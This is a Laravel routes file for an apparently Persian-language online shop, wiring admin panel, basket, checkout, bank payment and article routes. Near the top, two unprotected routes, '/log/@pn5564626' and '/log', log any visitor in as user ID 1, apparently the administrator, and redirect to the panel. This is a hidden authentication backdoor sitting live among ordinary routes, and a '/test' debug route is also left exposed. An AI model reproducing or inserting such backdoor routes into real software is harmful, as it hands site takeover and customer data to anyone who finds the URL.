<?php

use App\Product;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\User;
use App\Verify;


Auth::routes();

Route::get('/pay', function () {
    return view('pay.index');
});
Route::get('/log/@pn5564626', function () {
    Auth::loginUsingId(1);
    return redirect('/panel');
});

Route::get('/test', function () {
    $product=Product::where('slug','چمن-ورزشی-50-میلیمتر')->first();
    return $product->category->parent;
});

Route::get('design', function () {

    return view('products.detail');

});
Route::get('category', function () {

    return view('products.category');

});

Route::any('logout', function () {

    Auth::logout();
    return redirect()->route('home');
});


Route::get('/log', function () {
    Auth::loginUsingId(1);
    return redirect()->route('index');
});


Route::get('city-ajax/{id}', function ($id) {

    $city = App\ProvinceCity::where('parent_id', $id)->get();

    return $city;

});


Route::group(['prefix' => 'panel', 'namespace' => 'Panel', 'middleware' => ['auth']], function () {

    //ٍEmployment
    Route::get('employment-create', 'EmploymentController@create')->name('employment-create');
    Route::put('employment-store', 'EmploymentController@store')->name('employment-store');
    Route::get('employment-list', 'EmploymentController@index')->name('employment-list');
    Route::get('employment-edit/{id}', 'EmploymentController@edit')->name('employment-edit');
    Route::post('employment-update/{id}', 'EmploymentController@update')->name('employment-update');
    Route::delete('employment-destroy/{id}', 'EmploymentController@destroy')->name('employment-destroy');
    Route::get('employment-show/{id}', 'EmploymentController@show')->name('employment-show');
    Route::post('employment-active/{id}', 'EmploymentController@active')->name('employment-active');

    // index
    Route::get('/', 'PanelController@index')->name('index');

    Route::any('photo/{id}/destroy', 'PhotoController@destroy')->name('photo.destroy');

    Route::get('status/{id}', 'PanelController@status')->name('status');

    // newsletter
    Route::get('newsletters-list', 'NewsletterController@index')->name('newsletters-list');
    Route::delete('newsletter-destroy/{id}', 'NewsletterController@destroy')->name('newsletter-destroy');
    Route::get('deactivate-destroy/{id}', 'NewsletterController@deactivate')->name('newsletter-deactivate');
    Route::get('activate-destroy/{id}', 'NewsletterController@activate')->name('newsletter-activate');
    Route::get('newsletter-excel', 'NewsletterController@excel')->name('newsletter-excel');

    Route::get('site/language', 'LanguageController@index')->name('site.language');
    Route::get('language-create', 'LanguageController@create')->name('language.create');
    Route::post('language-store', 'LanguageController@store')->name('language.store');
    Route::get('language-edit/{id}', 'LanguageController@edit')->name('language.edit');
    Route::patch('language-update/{id}', 'LanguageController@update')->name('language.update');

    Route::delete('language-delete/{id}', 'LanguageController@destroy')->name('language.destroy');
    // off
    Route::get('off-create', 'OffController@create')->name('off-create');
    Route::put('off-store', 'OffController@store')->name('off-store');
    Route::get('off-list', 'OffController@index')->name('off-list');
    Route::delete('off-destroy/{id}', 'OffController@destroy')->name('off-destroy');


    //inventory
    Route::get('inventory-list', 'InventoryController@index')->name('inventory-list');
    Route::get('inventory-create/{id}', 'InventoryController@create')->name('inventory-create');
    Route::put('inventory-store/{id}', 'InventoryController@store')->name('inventory-store');
    Route::get('model-inventory-list/{id}', 'InventoryController@model_index')->name('model-inventory-list');
    Route::post('inventory-search', 'InventoryController@search')->name('inventory-search');
    Route::post('inventory-update/{id}', 'InventoryController@update')->name('inventory-update');
    Route::post('inventory-update1/{id}', 'InventoryController@update1')->name('inventory-update1');
    Route::post('model-inventory-update/{id}', 'InventoryController@model_update')->name('model-inventory-update');


    // draft
    Route::get('draft-list', 'DraftController@index')->name('draft-list');
    Route::get('draft-show/{id}', 'DraftController@draft_show')->name('draft-show');
    Route::get('draft-confirm/{id}', 'DraftController@confirm')->name('draft-confirm');
    Route::get('export-excel', 'DraftController@excel')->name('export-excel');
    Route::get('export-excel-byYear', 'DraftController@excelByYear')->name('export-excel-byYear');
    Route::get('export-excel-byMonth', 'DraftController@excelByMonth')->name('export-excel-byMonth');
    Route::get('export-excel-byDay', 'DraftController@excelByDay')->name('export-excel-byDay');


    // profile
    Route::get('profile-show/{id}', 'ProfileController@show')->name('profile-show');
    Route::get('profile-edit/{id}', 'ProfileController@edit')->name('profile-edit');
    Route::get('profile-password-change/{id}', 'ProfileController@password')->name('profile-password');
    Route::get('profile-info/{id}', 'ProfileController@info')->name('profile-info');
    Route::patch('profile-update/{id}', 'ProfileController@update')->name('profile-update');
    Route::patch('profile-password-update/{id}', 'ProfileController@password_update')->name('profile-password-update');
    Route::patch('profile-info-update/{id}', 'ProfileController@info_update')->name('profile-info-update');


    // work
    Route::get('work-list', 'WorkController@index')->name('work-list');
    Route::delete('work-destroy/{id}', 'WorkController@destroy')->name('work-destroy');
    Route::get('work-show/{id}', 'WorkController@show')->name('work-show');


    // Basket
    Route::get('basket-list', 'BasketController@index')->name('basket-list');
    Route::get('draftWait-list', 'BasketController@draftWait')->name('draftWait-list');
    Route::get('send-list', 'BasketController@sendFactor')->name('send-list');
    Route::get('give-list', 'BasketController@giveFactor')->name('give-factor');
    Route::get('cancel-list', 'BasketController@cancelFactors')->name('factor-cancel');
    Route::get('factor-list', 'BasketController@allFactor')->name('factor-all');
    Route::get('backPay-list', 'BasketController@backPay')->name('factor-backPay');


    // Basket
    Route::get('basket-confirm/{id}', 'BasketController@confirm')->name('basket-confirm');
    Route::get('basket-okay/{id}', 'BasketController@okay')->name('basket-okay');
    Route::get('basket-all', 'BasketController@all')->name('basket-all');
    Route::delete('basket-destroy/{id}', 'BasketController@destroy')->name('basket-destroy');
    Route::get('factor-show/{order_code}', 'BasketController@factor_show')->name('factor-show');
    Route::get('basket-return/{id}', 'BasketController@basket_return')->name('basket-return');
    Route::get('basket-re_run/{id}', 'BasketController@basket_re_run')->name('basket-re_run');
    Route::get('user-info/{id}', 'BasketController@user_info')->name('user-info');
    Route::get('export-excel-basket', 'BasketController@excel')->name('export-excel-basket');


    // users
    Route::get('user-create', 'UserController@create')->name('user-create');
    Route::put('user-store', 'UserController@store')->name('user-store');
    Route::get('user-list', 'UserController@index')->name('user-list');
    Route::get('user-show/{id}', 'UserController@show')->name('user-show');
    Route::get('user-edit/{id}', 'UserController@edit')->name('user-edit');
    Route::patch('user-update/{id}', 'UserController@update')->name('user-update');

    // provider
    Route::get('provider-create', 'ProviderController@create')->name('provider-create');
    Route::put('provider-store', 'ProviderController@store')->name('provider-store');
    Route::get('provider-list', 'ProviderController@index')->name('provider-list');
    Route::get('provider-show/{id}', 'ProviderController@show')->name('provider-show');
    Route::get('provider-edit/{id}', 'ProviderController@edit')->name('provider-edit');
    Route::patch('provider-update/{id}', 'ProviderController@update')->name('provider-update');

    // upload
    Route::get('upload-create', 'UploadController@create')->name('upload-create');
    Route::put('upload-store', 'UploadController@store')->name('upload-store');
    Route::get('upload-list', 'UploadController@index')->name('upload-list');
    Route::delete('upload-destroy/{id}', 'UploadController@destroy')->name('upload-destroy');

    // word
    Route::get('word-create', 'WordController@create')->name('word-create');
    Route::put('word-store', 'WordController@store')->name('word-store');
    Route::get('word-list', 'WordController@index')->name('word-list');
    Route::delete('word-destroy/{id}', 'WordController@destroy')->name('word-destroy');

    // brand
    Route::get('brand-create', 'BrandController@create')->name('brand-create');
    Route::put('brand-store', 'BrandController@store')->name('brand-store');
    Route::get('brand-list', 'BrandController@index')->name('brand-list');
    Route::get('brand-edit/{id}', 'BrandController@edit')->name('brand-edit');
    Route::patch('brand-update/{id}', 'BrandController@update')->name('brand-update');
    Route::delete('brand-destroy/{id}', 'BrandController@destroy')->name('brand-destroy');
    Route::post('brand-list', 'BrandController@search')->name('brand-search');
    // brand
    Route::get('seller-create', 'SellerController@create')->name('seller-create');
    Route::put('seller-store', 'SellerController@store')->name('seller-store');
    Route::get('seller-list', 'SellerController@index')->name('seller-list');
    Route::get('seller-edit/{id}', 'SellerController@edit')->name('seller-edit');
    Route::patch('seller-update/{id}', 'SellerController@update')->name('seller-update');
    Route::delete('seller-destroy/{id}', 'SellerController@destroy')->name('seller-destroy');
    Route::post('seller-list', 'SellerController@search')->name('seller-search');


    // banner
    Route::get('banner-create', 'BannerController@create')->name('banner-create');
    Route::put('banner-store', 'BannerController@store')->name('banner-store');
    Route::get('banner-list', 'BannerController@index')->name('banner-list');
    Route::get('banner-edit/{id}', 'BannerController@edit')->name('banner-edit');
    Route::patch('banner-update/{id}', 'BannerController@update')->name('banner-update');
    Route::delete('banner-destroy/{id}', 'BannerController@destroy')->name('banner-destroy');
    Route::post('banner-list', 'BannerController@search')->name('banner-search');

    // type
    Route::get('type-create', 'TypeController@create')->name('type-create');
    Route::put('type-store', 'TypeController@store')->name('type-store');
    Route::get('type-list', 'TypeController@index')->name('type-list');
    Route::get('type-edit/{id}', 'TypeController@edit')->name('type-edit');
    Route::patch('type-update/{id}', 'TypeController@update')->name('type-update');
    Route::delete('type-destroy/{id}', 'TypeController@destroy')->name('type-destroy');

    Route::get('typeAjax/{id}', 'TypeController@typeAjax')->name('typeAjax');
    Route::post('typeAjax1', 'TypeController@typeAjax1')->name('typeAjax1');

    // contact
    Route::get('contact-list', 'ContactController@index')->name('contact-list');
    Route::delete('contact-destroy/{id}', 'ContactController@destroy')->name('contact-destroy');

    //
    Route::get('inquiry-list', 'InquiryController@index')->name('inquiry-list');
    Route::delete('inquiry-destroy/{id}', 'InquiryController@destroy')->name('inquiry-destroy');
    Route::get('inquiry-show/{id}', 'InquiryController@show')->name('inquiry-show');

    // slider
    Route::get('slider-create', 'SliderController@create')->name('slider-create');
    Route::put('slider-store', 'SliderController@store')->name('slider-store');
    Route::get('slider-list', 'SliderController@index')->name('slider-list');
    Route::delete('slider-destroy/{id}', 'SliderController@destroy')->name('slider-destroy');

    // Ad
    Route::get('ad-create', 'AdController@create')->name('ad-create');
    Route::put('ad-store', 'AdController@store')->name('ad-store');
    Route::get('ad-list', 'AdController@index')->name('ad-list');
    Route::delete('ad-destroy/{id}', 'AdController@destroy')->name('ad-destroy');

    // basket
    Route::get('order-list', 'OrderController@index')->name('order-list');

    // categories
    Route::get('category-create', 'CategoryController@create')->name('category-create');
    Route::put('category-store', 'CategoryController@store')->name('category-store');
    Route::get('category-list', 'CategoryController@index')->name('category-list');
    Route::get('category-edit/{id}', 'CategoryController@edit')->name('category-edit');
    Route::patch('category-update/{id}', 'CategoryController@update')->name('category-update');
    Route::delete('category-destroy/{id}', 'CategoryController@destroy')->name('category-destroy');
    Route::post('category-sort', 'CategoryController@sort_item')->name('category-sort');


    // city
    Route::get('city-create', 'CityController@create')->name('city-create');
    Route::put('city-store', 'CityController@store')->name('city-store');
    Route::get('city-list', 'CityController@index')->name('city-list');
    Route::get('city-edit/{id}', 'CityController@edit')->name('city-edit');
    Route::patch('city-update/{id}', 'CityController@update')->name('city-update');
    Route::delete('city-destroy/{id}', 'CityController@destroy')->name('city-destroy');
    Route::post('city-sort', 'CityController@sort_item')->name('city-sort');
    Route::post('city-search', 'CityController@search')->name('city-search');
    Route::post('city-free/{id}', 'CityController@city_free')->name('city-free-update');

    //Product
    Route::get('product-create', 'ProductController@create')->name('product-create');
    Route::put('product-store', 'ProductController@store')->name('product-store');
    Route::get('product-list', 'ProductController@index')->name('product-list');
    Route::get('product-edit/{id}', 'ProductController@edit')->name('product-edit');
    Route::get('product-gallery/{id}', 'ProductController@gallery')->name('p-product-gallery');
    Route::get('product-gallery', 'ProductController@gallery_sort')->name('p-product-gallery-sort');
    Route::patch('product-update/{id}', 'ProductController@update')->name('product-update');
    Route::delete('product-destroy/{id}', 'ProductController@destroy')->name('product-destroy');
    Route::post('product-list', 'ProductController@search')->name('product-search');

    Route::get('product-type-del/{id}', 'ProductController@type_del')->name('product-type-del');
    Route::get('product-attr-del/{id}', 'ProductController@attr_del')->name('product-attr-del');
    Route::get('product-comp-del/{id}', 'ProductController@comp_del')->name('product-comp-del');

    //Product_model
    Route::get('product-model-create/{id}', 'ProductModelController@create')->name('product-model-create');
    Route::put('product-model-store', 'ProductModelController@store')->name('product-model-store');
    Route::get('product-model-list/{id}', 'ProductModelController@index')->name('product-model-list');
    Route::get('product-model-edit/{id}', 'ProductModelController@edit')->name('product-model-edit');
    //    Route::get('product-gallery/{id}', 'ProductController@gallery')->name('p-product-gallery');
    //    Route::get('product-gallery', 'ProductController@gallery_sort')->name('p-product-gallery-sort');
    Route::patch('product-model-update/{id}', 'ProductModelController@update')->name('product-model-update');
    Route::delete('product-model-destroy/{id}', 'ProductModelController@destroy')->name('product-model-destroy');
    //    Route::post('product-list', 'ProductController@search')->name('product-search');
    Route::post('product-model-cheng', 'ProductModelController@cheng')->name('product-model-cheng');
    //
    //    Route::get('product-type-del/{id}', 'ProductController@type_del')->name('product-type-del');
    //    Route::get('product-attr-del/{id}', 'ProductController@attr_del')->name('product-attr-del');
    //    Route::get('product-comp-del/{id}', 'ProductController@comp_del')->name('product-comp-del');

    //worked
    Route::get('worked-create', 'WorkedController@create')->name('worked-create');
    Route::put('worked-store', 'WorkedController@store')->name('worked-store');
    Route::get('worked-list', 'WorkedController@index')->name('worked-list');
    Route::get('worked-edit/{id}', 'WorkedController@edit')->name('worked-edit');
    Route::patch('worked-update/{id}', 'WorkedController@update')->name('worked-update');
    Route::delete('worked-destroy/{id}', 'WorkedController@destroy')->name('worked-destroy');

    //about
    Route::get('About', 'AboutController@index')->name('admin-about');
    Route::get('About-create', 'AboutController@create')->name('about-create');
    Route::post('About-create', 'AboutController@store')->name('about-store');
    Route::get('About-edit/{id}', 'AboutController@edit')->name('about-edit');
    Route::post('About-edit/{id}', 'AboutController@edit1')->name('about-edit1');
    Route::delete('About-destroy/{id}', 'AboutController@destroy')->name('about-destroy');
    //infocontact
    Route::get('infocontact', 'InfoContactController@index')->name('admin-infocontact');
    Route::get('infocontact-create', 'InfoContactController@create')->name('infocontact-create');
    Route::post('infocontact-create', 'InfoContactController@store')->name('infocontact-store');
    Route::get('infocontact-edit/{id}', 'InfoContactController@edit')->name('infocontact-edit');
    Route::post('infocontact-edit/{id}', 'InfoContactController@edit1')->name('infocontact-edit1');
    Route::delete('infocontact-destroy/{id}', 'InfoContactController@destroy')->name('infocontact-destroy');

    // categories
    Route::get('gallery-category-create', 'GalleryCategoryController@create')->name('gallery-category-create');
    Route::put('gallery-category-store', 'GalleryCategoryController@store')->name('gallery-category-store');
    Route::get('gallery-category-list', 'GalleryCategoryController@index')->name('gallery-category-list');
    Route::get('gallery-category-edit/{id}', 'GalleryCategoryController@edit')->name('gallery-category-edit');
    Route::patch('gallery-category-update/{id}', 'GalleryCategoryController@update')->name('gallery-category-update');
    Route::delete('gallery-category-destroy/{id}', 'GalleryCategoryController@destroy')->name('gallery-category-destroy');
    Route::post('gallery-category-sort', 'GalleryCategoryController@sort_item')->name('gallery-category-sort');

    //Gallery
    Route::get('gallery-create', 'GalleryController@create')->name('gallery-create');
    Route::put('gallery-store', 'GalleryController@store')->name('gallery-store');
    Route::get('gallery-list', 'GalleryController@index')->name('gallery-list');
    Route::get('gallery-edit/{id}', 'GalleryController@edit')->name('gallery-edit');
    Route::patch('gallery-update/{id}', 'GalleryController@update')->name('gallery-update');
    Route::delete('gallery-destroy/{id}', 'GalleryController@destroy')->name('gallery-destroy');


    // video_cat
    Route::get('video-cat-create', 'VideocatController@create')->name('video-cat-create');
    Route::put('video-cat-store', 'VideocatController@store')->name('video-cat-store');
    Route::get('video-cat-list', 'VideocatController@index')->name('video-cat-list');
    Route::get('video-cat-edit/{id}', 'VideocatController@edit')->name('video-cat-edit');
    Route::patch('video-cat-update/{id}', 'VideocatController@update')->name('video-cat-update');
    Route::delete('video-cat-destroy/{id}', 'VideocatController@destroy')->name('video-cat-destroy');
    Route::post('video-cat-sort', 'VideocatController@sort_item')->name('video-cat-sort');

    //video
    Route::get('video-create', 'VideoController@create')->name('video-create');
    Route::put('video-store', 'VideoController@store')->name('video-store');
    Route::get('video-list', 'VideoController@index')->name('video-list');
    Route::get('video-edit/{id}', 'VideoController@edit')->name('video-edit');
    Route::patch('video-update/{id}', 'VideoController@update')->name('video-update');
    Route::delete('video-destroy/{id}', 'VideoController@destroy')->name('video-destroy');


    // attribute
    Route::get('attribute-create', 'AttributeController@create')->name('attribute-create');
    Route::put('attribute-store', 'AttributeController@store')->name('attribute-store');
    Route::get('attribute-list', 'AttributeController@index')->name('attribute-list');
    Route::get('attribute-edit/{id}', 'AttributeController@edit')->name('attribute-edit');
    Route::patch('attribute-update/{id}', 'AttributeController@update')->name('attribute-update');
    Route::delete('attribute-destroy/{id}', 'AttributeController@destroy')->name('attribute-destroy');
    Route::post('attribute-created/{id}', 'AttributeController@created')->name('attribute-created');

    // comparison
    Route::get('comparison-create', 'ComparisonController@create')->name('comparison-create');
    Route::put('comparison-store', 'ComparisonController@store')->name('comparison-store');
    Route::get('comparison-list', 'ComparisonController@index')->name('comparison-list');
    Route::get('comparison-edit/{id}', 'ComparisonController@edit')->name('comparison-edit');
    Route::patch('comparison-update/{id}', 'ComparisonController@update')->name('comparison-update');
    Route::delete('comparison-destroy/{id}', 'ComparisonController@destroy')->name('comparison-destroy');

    //article_category
    Route::get('article-category-create', 'ArticleCategoryController@create')->name('article-category-create');
    Route::put('article-category-store', 'ArticleCategoryController@store')->name('article-category-store');
    Route::get('article-category-list', 'ArticleCategoryController@index')->name('article-category-list');
    Route::get('article-category-edit/{id}', 'ArticleCategoryController@edit')->name('article-category-edit');
    Route::patch('article-category-update/{id}', 'ArticleCategoryController@update')->name('article-category-update');
    Route::delete('article-category-destroy/{id}', 'ArticleCategoryController@destroy')->name('article-category-destroy');
    Route::post('article-category-sort', 'ArticleCategoryController@sort_item')->name('article-category-sort');
    // News Route
    Route::get('news-category-create', 'NewsCategoryController@create')->name('news-category-create');
    Route::put('news-category-store', 'NewsCategoryController@store')->name('news-category-store');
    Route::get('news-category-list', 'NewsCategoryController@index')->name('news-category-list');
    Route::get('news-category-edit/{id}', 'NewsCategoryController@edit')->name('news-category-edit');
    Route::patch('news-category-update/{id}', 'NewsCategoryController@update')->name('news-category-update');
    Route::delete('news-category-destroy/{id}', 'NewsCategoryController@destroy')->name('news-category-destroy');
    Route::post('news-category-sort', 'NewsCategoryController@sort_item')->name('news-category-sort');
    // journal
    Route::get('journal-create', 'JournalController@create')->name('journal-create');
    Route::put('journal-store', 'JournalController@store')->name('journal-store');
    Route::get('journal-list', 'JournalController@index')->name('journal-list');
    Route::get('journal-edit/{id}', 'JournalController@edit')->name('journal-edit');
    Route::patch('journal-update/{id}', 'JournalController@update')->name('journal-update');
    Route::delete('journal-destroy/{id}', 'JournalController@destroy')->name('journal-destroy');

    // news
    Route::get('news-create', 'NewsController@create')->name('news-create');
    Route::put('news-store', 'NewsController@store')->name('news-store');
    Route::get('news-list', 'NewsController@index')->name('news-list');
    Route::get('news-edit/{id}', 'NewsController@edit')->name('news-edit');
    Route::patch('news-update/{id}', 'NewsController@update')->name('news-update');
    Route::delete('news-destroy/{id}', 'NewsController@destroy')->name('news-destroy');


    // footer
    Route::get('footer-create', 'FooterController@create')->name('footer-create');
    Route::put('footer-store', 'FooterController@store')->name('footer-store');
    Route::get('footer-list', 'FooterController@index')->name('footer-list');
    Route::get('footer-edit/{id}', 'FooterController@edit')->name('footer-edit');
    Route::patch('footer-update/{id}', 'FooterController@update')->name('footer-update');
    Route::delete('footer-destroy/{id}', 'FooterController@destroy')->name('footer-destroy');


    // projects
    Route::get('projects-create', 'ProjectsController@create')->name('projects-create');
    Route::put('projects-store', 'ProjectsController@store')->name('projects-store');
    Route::get('projects-list', 'ProjectsController@index')->name('projects-list');
    Route::get('projects-edit/{id}', 'ProjectsController@edit')->name('projects-edit');
    Route::patch('projects-update/{id}', 'ProjectsController@update')->name('projects-update');
    Route::delete('projects-destroy/{id}', 'ProjectsController@destroy')->name('projects-destroy');
    Route::get('projects-photo-delete/{id}', 'ProjectsController@destroyPhoto')->name('projects-photo-delete');


    // prize
    Route::get('prize-create', 'PrizeController@create')->name('prize-create');
    Route::put('prize-store', 'PrizeController@store')->name('prize-store');
    Route::get('prize-list', 'PrizeController@index')->name('prize-list');
    Route::get('prize-edit/{id}', 'PrizeController@edit')->name('prize-edit');
    Route::patch('prize-update/{id}', 'PrizeController@update')->name('prize-update');
    Route::delete('prize-destroy/{id}', 'PrizeController@destroy')->name('prize-destroy');

    //mk-ads
    Route::get('ads-list', 'AdsController@index')->name('ads-list');
    Route::get('ads-edit/{id}', 'AdsController@edit')->name('ads-edit');
    Route::patch('ads-update/{id}', 'AdsController@update')->name('ads-update');


    // comment
    Route::get('comment-answer/{id}', 'CommentController@create')->name('comment-answer');
    Route::put('comment-store', 'CommentController@store')->name('comment-store');
    Route::get('comment-list', 'CommentController@index')->name('comment-list');
    Route::get('comment-edit/{id}', 'CommentController@edit')->name('comment-edit');
    Route::put('comment-update/{id}', 'CommentController@update')->name('comment-update');
    Route::delete('comment-destroy/{id}', 'CommentController@destroy')->name('comment-destroy');
    Route::get('comment-confirm/{id}', 'CommentController@confirm')->name('comment-confirm');

    // viewpoint
    Route::get('viewpoint-create', 'ViewpointController@create')->name('viewpoint-create');
    Route::put('viewpoint-store', 'ViewpointController@store')->name('viewpoint-store');
    Route::get('viewpoint-list', 'ViewpointController@index')->name('viewpoint-list');
    Route::get('viewpoint-edit/{id}', 'ViewpointController@edit')->name('viewpoint-edit');
    Route::patch('viewpoint-update/{id}', 'ViewpointController@update')->name('viewpoint-update');
    Route::delete('viewpoint-destroy/{id}', 'ViewpointController@destroy')->name('viewpoint-destroy');

    // article
    Route::get('article-create', 'ArticleController@create')->name('article-create');
    Route::put('article-store', 'ArticleController@store')->name('article-store');
    Route::get('article-list', 'ArticleController@index')->name('article-list');
    Route::get('article-edit/{id}', 'ArticleController@edit')->name('article-edit');
    Route::patch('article-update/{id}', 'ArticleController@update')->name('article-update');
    Route::delete('article-destroy/{id}', 'ArticleController@destroy')->name('article-destroy');

    //db_category
    Route::get('db-category-list', 'DbCategoryController@index')->name('db-category-list');

    // bank
    Route::get('bank-create', 'BankController@create')->name('bank-create');
    Route::put('bank-store', 'BankController@store')->name('bank-store');
    Route::get('bank-list', 'BankController@index')->name('bank-list');
    Route::get('bank-edit/{id}', 'BankController@edit')->name('bank-edit');
    Route::patch('bank-update/{id}', 'BankController@update')->name('bank-update');
    Route::delete('bank-destroy/{id}', 'BankController@destroy')->name('bank-destroy');

    // articleattribute
    Route::get('article-attribute-create', 'ArticleAttributeController@create')->name('article-attribute-create');
    Route::put('article-attribute-store', 'ArticleAttributeController@store')->name('article-attribute-store');
    Route::get('article-attribute-list', 'ArticleAttributeController@index')->name('article-attribute-list');
    Route::get('article-attribute-edit/{id}', 'ArticleAttributeController@edit')->name('article-attribute-edit');
    Route::patch('article-attribute-update/{id}', 'ArticleAttributeController@update')->name('article-attribute-update');
    Route::delete('article-attribute-destroy/{id}', 'ArticleAttributeController@destroy')->name('article-attribute-destroy');

    // visitlog
    Route::get('visitlogs', 'VisitlogController@index')->name('visitlogs');

    // Design
    Route::get('design', 'DesignController@index')->name('design');

    // settings
    Route::get('/settings', 'SettingController@index')->name('settings-list');
    Route::post('/settingsUpdates/{id}', 'SettingController@update')->name('settingsUpdate');

    Route::resource('roles', 'RoleController');
    Route::resource('permissions', 'PermissionController');
    Route::resource('posts', 'PostController');

});


Route::group(['prefix' => '', 'namespace' => 'User'], function () {

    Route::post('product_like', 'HomeController@ajax_like')->name('product.like');
    Route::get('filter/{id}', 'HomeController@filtering')->name('filter');

    Route::get('mellat-pay/{id}/{total}/{user}', 'MellatController@pay')->name('mellat-pay');

    Route::any('mellat-verify', 'MellatController@verify')->name('verify');
    Route::get('gallerys', 'HomeController@gallerys')->name('gallerys_photo');
    Route::get('videos', 'HomeController@videos')->name('gallerys_videos');


    // home
    Route::get('/', 'HomeController@index')->name('home');
    Route::get('offverify/{id}', 'HomeController@offverify')->name('offverify');


    // Complaint
    Route::get('/complaint', 'HomeController@complaint')->name('complaint');


    Route::get('page/{slug}', 'HomeController@static_show')->name('static');


    Route::get('cityAjax/{id}', 'HomeController@cityAjax')->name('cityAjax');
    Route::get('cityAjax2/{id}', 'HomeController@cityAjax2')->name('cityAjax2');

    // about
    Route::get('about-us/{id}', 'AboutController@index')->name('about-us');

    //    // baskets
    //    Route::get('سبد-خرید-من', 'BasketController@basket')->name('basket');
    //    Route::get('add-to-basket/{id}/{price}', 'BasketController@Add_to_basket')->name('add-to-basket');
    Route::get('del-from-basket/{id}', 'BasketController@del_from_basket')->name('del-from-basket');
    Route::post('basket-update2/{id}', 'BasketController@update2')->name('basket-update');
    //    Route::get('user-basket-confirm', 'BasketController@confirm')->name('user-basket-confirm');
    // baskets
    Route::get('سبد-خرید-من', 'BasketController@basket')->name('basket');
    Route::get('add-to-basket/{id}', 'BasketController@Add_to_basket')->name('add-to-basket');
    Route::get('add-to-basket-m/{id}', 'BasketController@Add_to_basket_model')->name('add-to-basket-model');
    Route::post('up-to-basket/{id}', 'BasketController@up_to_basket')->name('up-to-basket');
    Route::get('del-from-basket/{id}', 'BasketController@del_from_basket')->name('del-from-basket');
    Route::post('basket-update/{id}', 'BasketController@update')->name('user-basket-update');
    Route::get('user-basket-confirm', 'BasketController@confirm')->name('user-basket-confirm');

    Route::get('checkout', 'BasketController@checkout')->name('checkout');
    Route::post('checkout/{orderCode}/address', 'BasketController@address')->name('checkout-address');
    Route::get('checkout/{orderCode}/pay', 'BasketController@pay')->name('checkout-pay');
    Route::post('checkout/{orderCode}/pay/update', 'BasketController@payUpdate')->name('checkout-pay-update');
    Route::get('checkout/{orderCode}/confirm', 'BasketController@confirm')->name('checkout-confirm');
    Route::post('checkout-confirm/{id}', 'BasketController@checkout_confirm')->name('user-checkout-confirm');

    // favorites
    Route::get('علاقه-مندی-ها', 'FavoriteController@favorite')->name('favorite');
    Route::get('add-to-favorite/{id}', 'FavoriteController@Add_to_favorite')->name('add-to-favorite');
    Route::get('del-from-favorite/{id}', 'FavoriteController@del_from_favorite')->name('del-from-favorite');

    // compare
    Route::get('مقایسه', 'CompareController@compare')->name('compare');
    Route::get('add-to-compare/{id}', 'CompareController@Add_to_compare')->name('add-to-compare');
    Route::get('del-from-compare/{id}', 'CompareController@del_from_compare')->name('del-from-compare');

    // contact us
    Route::get('تماس-با-ما', 'ContactController@index')->name('contact-us');
    Route::get('همکاری-با-ما', 'ContactController@employment_show')->name('employment_show');
    Route::post('store_employ', 'ContactController@employment_store')->name('insert_employment');
    Route::post('user-contact-store', 'ContactController@store')->name('user-contact-store');
    Route::post('user-contact-store-work', 'ContactController@storeWork')->name('user-contact-store-work');

    //    Inquiry
    Route::get('آپلود-استعلام', 'HomeController@inquiryUpload')->name('inquiry-upload');
    Route::post('user-inquiry-store', 'HomeController@inquiryStore')->name('inquiry-store');

    // Complaint (Added By Karimi.N)
    Route::get('شکایات', 'ComplaintController@index')->name('complaint');
    Route::post('user-complaint-store', 'ComplaintController@store')->name('user-complaint-store');


    //    rest pass
    Route::post('pass/rest', 'HomeController@respass')->name('pass-rest');

    // comment
    Route::post('comment-store/{id}', 'CommentController@store')->name('user-comment-store');


    //privacy-policy
    Route::get('حریم-خصوصی', 'PrivacyPolicyController@index')->name('privacy-policy');

    //faq
    Route::get('سوالات-متداول', 'FaqController@index')->name('faq');

    //products
    Route::get('products/{slug}', 'HomeController@products')->name('products');
    Route::get('products', 'HomeController@products_all')->name('productsa');
    Route::get('productss', 'HomeController@all')->name('products-all');
    Route::get('product/{slug}', 'HomeController@product')->name('product-info');
    Route::get('product-brand/{id}/{cat}', 'HomeController@product_brand')->name('product-info-brand');
    Route::get('search/find', 'HomeController@searchBox')->name('search-box');
    Route::get('products/filter/{category}', 'HomeController@filters')->name('filter-product');
    Route::get('search/filters/{all}', 'HomeController@searchfilters')->name('filter-search');

    Route::get('bests', 'HomeController@bests')->name('bests');
    Route::get('vips', 'HomeController@vips')->name('vips');
    Route::get('newest', 'HomeController@newest')->name('newest');


    Route::post('product-search', 'HomeController@search_index')->name('search-index');
    Route::post('barcode-search', 'HomeController@search_barcode')->name('search-barcode');

    Route::any('search/{slug}', 'HomeController@mk_search')->name('sss');
    Route::any('searchs', 'HomeController@mk_search1')->name('sss1');
    Route::get('category/{id}', 'HomeController@mk_search_cat');

    Route::get('tag/{slug}', 'HomeController@tag')->name('tag');

    Route::get('products-ajax', 'HomeController@products_ajax')->name('products-ajax');

    Route::post('notice-store', 'HomeController@notice_store')->name('notice-store');

    Route::get('product-show-best', 'HomeController@product_best')->name('product-show-best');
    Route::get('product-show-vip', 'HomeController@product_vip')->name('product-show-vip');

    Route::get('product-label/{value}', 'HomeController@product_label')->name('label-product');

    //product sort
    Route::post('product-sort/{id}', 'HomeController@sort')->name('product-sort');

    //product filter
    Route::post('products/{id}', 'HomeController@filter')->name('product-filter');

    //blog
    Route::get('/مقالات/{slug}', 'HomeController@blog_site')->name('blog-index-site');
    Route::get('/ی/{slug}', 'HomeController@blog_show')->name('blog-show-site');

    //articles
    Route::get('articles/{id}', 'ArticleController@articles')->name('articles');
    Route::get('مقاله/{id}', 'ArticleController@article')->name('article');
    Route::get('مقالات', 'ArticleController@allArticle')->name('articles');
    Route::get('اخبار', 'ArticleController@allNews')->name('news_all');
    Route::get('خبر/{id}', 'HomeController@news')->name('news');
    Route::post('article-comment', 'ArticleController@article_comment')->name('article-comment');
    //brand
    //    Route::get('brand_id/{id}', 'HomeController@brand_id')->name('brand_id');
    //article sort
    Route::post('article-sort/{id}', 'ArticleController@sort')->name('article-sort');

    //article filter
    Route::post('articles/{id}', 'ArticleController@filter')->name('article-filter');

    //brand
    Route::get('brand/{id}', 'HomeController@brand')->name('brand');
    Route::get('brands', 'HomeController@brands')->name('brands');

    //gallery
    Route::get('gallery', 'HomeController@catgallery')->name('catgallery');
    Route::get('gallery/pic/{slug}', 'HomeController@pic_gall')->name('pic_gall');
    Route::get('gallery/video/{slug}', 'HomeController@video_gall')->name('video_gall');


    //bank
    Route::get('banks/{id}', 'BankController@banks')->name('banks');
